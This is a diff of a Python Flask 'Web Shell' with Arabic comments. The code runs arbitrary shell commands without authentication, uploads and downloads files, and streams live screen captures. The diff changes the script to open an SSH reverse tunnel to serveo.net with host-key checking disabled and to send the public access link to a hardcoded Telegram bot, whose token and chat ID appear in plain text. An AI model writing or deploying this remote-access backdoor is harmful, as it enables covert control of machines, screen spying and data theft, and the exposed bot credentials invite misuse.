@@ -5,45 +5,57 @@ import subprocess
 import threading
 import time
 import urllib.request
+import urllib.parse
 import json
+import re
 import mss
 import cv2
 import numpy as np
 
 app = Flask(__name__)
 
-# ضع بياناتك هنا بدقة (نسخ ولصق)
+# ضع بيانات تيليجرام الخاصة بك هنا لتستقبل الرابط عليها تلقائياً
 TELEGRAM_BOT_TOKEN = "8508402230:AAGK5iP1fxc7Dscu5pDmqWkAGLCCYLtKrB0"
 TELEGRAM_CHAT_ID = "8897834377"
 
 def send_telegram_message(message):
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message}).encode('utf-8')
+        url = "https://api.telegram.org/bot{}/sendMessage".format(TELEGRAM_BOT_TOKEN)
+        data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message})
+        data = data.encode('utf-8')
         req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
         urllib.request.urlopen(req)
     except Exception as e:
-        print(f"[-] Telegram Error: {e}")
+        print("[-] Telegram Error: {}".format(e))
 
-# دالة تشغيل Ngrok المحلي وجلب الرابط وإرساله للتيليجرام تلقائياً
-def start_ngrok_and_notify():
+# دالة تشغيل Serveo تلقائياً عبر SSH وسحب الرابط وإرساله للتيليجرام (متوافقة مع بايثون القديم)
+def start_serveo_and_notify():
     time.sleep(3) # الانتظار حتى يعمل سيرفر الفلاسك
     try:
-        # تشغيل ngrok المحلي في الخلفية على البورت 8080
-        os.system("./ngrok http 8080 > /dev/null 2>&1 &")
-        time.sleep(4)
+        # تشغيل خدمة serveo على البورت 8080 في الخلفية وحفظ المخرجات في ملف مؤقت
+        os.system("ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo_log.txt 2>&1 &")
         
-        # جلب الرابط الخارجي من واجهة ngrok المحلية
-        req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
-        data = json.loads(req.read().decode())
-        public_url = data['tunnels'][0]['public_url']
+        # الانتظار قليلاً حتى يتم إنشاء النفق واستخراج الرابط
+        public_url = None
+        for _ in range(10):
+            time.sleep(2)
+            if os.path.exists("serveo_log.txt"):
+                with open("serveo_log.txt", "r") as f:
+                    content = f.read()
+                    # البحث عن الرابط في مخرجات الـ ssh
+                    match = re.search(r'https://[a-zA-Z0-9-]+\.serveo\.net', content)
+                    if match:
+                        public_url = match.group(0)
+                        break
         
-        # إرسال الرابط مباشرة إلى بوت تيليجرام
-        msg = f"🚀 تم تشغيل الـ Web Shell بنجاح على جهاز الـ Jetson!\n\n🔗 رابط الدخول الخارجي:\n{public_url}"
-        send_telegram_message(msg)
-        print(f"[+] تم إرسال الرابط إلى تيليجرام بنجاح: {public_url}")
+        if public_url:
+            msg = "🚀 مرحباً يا محمد! تم تشغيل الـ Web Shell عبر Serveo بنجاح.\n\n🔗 رابط الدخول الخارجي:\n{}".format(public_url)
+            send_telegram_message(msg)
+            print("[+] تم إرسال الرابط إلى تيليجرام بنجاح: {}".format(public_url))
+        else:
+            print("[-] لم يتم العثور على رابط Serveo في السجلات.")
     except Exception as e:
-        print(f"[-] خطأ في تشغيل أو جلب رابط Ngrok: {e}")
+        print("[-] خطأ في تشغيل Serveo: {}".format(e))
 
 # دالة التقاط الشاشة للبث الحي
 def generate_frames():
@@ -72,7 +84,7 @@ HTML_TEMPLATE = """
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Advanced Web Shell with Live Stream</title>
+    <title>Linux Remote Web Shell</title>
     <style>
         body { background-color: #0d1117; color: #c9d1d9; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
         h2 { color: #58a6ff; text-align: center; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
@@ -98,7 +110,7 @@ HTML_TEMPLATE = """
         <img src="{{ url_for('video_feed') }}" alt="Live Stream">
     </div>
     <div class="container">
-        <h2>⚡ لوحة التحكم الذكية مع البث المباشر ⚡</h2>
+        <h2>⚡ Linux Remote Web Shell (Python 3.6 Compatible) ⚡</h2>
         <div class="section">
             <div class="path-bar">📁 المسار الحالي: <code>{{ current_path }}</code></div>
             <a href="/?path={{ parent_path }}"><button>⬆ العودة للمجلد الأعلى</button></a>
@@ -113,7 +125,7 @@ HTML_TEMPLATE = """
             </form>
         </div>
         <div class="section">
-            <h3>📂 استعراض الأقراص والملفات</h3>
+            <h3>📂 استعراض الملفات والأقراص</h3>
             <table>
                 <tr><th>الاسم</th><th>النوع</th><th>إجراءات</th></tr>
                 {% for item in items %}
@@ -153,25 +165,25 @@ def index():
     current_path = request.args.get('path', os.getcwd())
     current_path = os.path.abspath(current_path)
     parent_path = os.path.dirname(current_path)
-    output = "أهلاً بك يا محمد! نظام التحكم والبث الحي جاهز:\n"
+    output = "أهلاً بك يا محمد! نظام التحكم متوافق مع بايثون القديم وجاهز:\n"
     
     if request.method == "POST":
         action = request.form.get("action")
         if action == "cmd":
             command = request.form.get("command")
             if command:
-                output += f"root@system:{current_path}$ {command}\n"
+                output += "linux@root:{}$ {}\n".format(current_path, command)
                 try:
                     res = subprocess.run(command, shell=True, cwd=current_path, capture_output=True, text=True, timeout=15)
                     output += res.stdout + res.stderr
                 except Exception as e:
-                    output += f"Error: {str(e)}\n"
+                    output += "Error: {}\n".format(str(e))
         elif action == "upload":
             uploaded_file = request.files.get('file')
             if uploaded_file:
                 file_path = os.path.join(current_path, uploaded_file.filename)
                 uploaded_file.save(file_path)
-                output += f"[+] تم رفع الملف بنجاح إلى: {file_path}\n"
+                output += "[+] تم رفع الملف بنجاح إلى: {}\n".format(file_path)
 
     items = []
     try:
@@ -182,7 +194,7 @@ def index():
                 'path': entry.path
             })
     except Exception as e:
-        output += f"خطأ: {str(e)}\n"
+        output += "خطأ: {}\n".format(str(e))
 
     return render_template_string(HTML_TEMPLATE, current_path=current_path, parent_path=parent_path, output=output, items=items)
 
@@ -198,8 +210,8 @@ def download():
     return "الملف غير موجود!", 404
 
 if __name__ == "__main__":
-    # تشغيل خيط خلفي لتفعيل نجروك وإرسال الرابط للبوت تلقائياً
-    t = threading.Thread(target=start_ngrok_and_notify)
+    # تشغيل خيط خلفي لتفعيل Serveo وإرسال الرابط للبوت تلقائياً
+    t = threading.Thread(target=start_serveo_and_notify)
     t.daemon = True
     t.start()
     
